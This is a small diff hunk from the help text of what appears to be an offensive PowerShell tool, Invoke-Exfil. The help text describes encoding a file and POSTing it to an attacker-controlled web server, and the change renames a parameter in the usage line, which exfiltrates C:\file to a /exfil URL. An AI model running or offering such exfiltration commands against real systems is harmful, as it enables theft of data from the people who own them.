@@ -35,7 +35,7 @@ param (
    [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
        send a file to an attacker-controlled web server.
 	
-   [*] Usage: Invoke-Exfil -RestMethod -File C:\file -Url https://192.168.1.1/exfil
+   [*] Usage: Invoke-Exfil -RestMethod -LocalFile C:\file -Url https://192.168.1.1/exfil
    
 
 "@
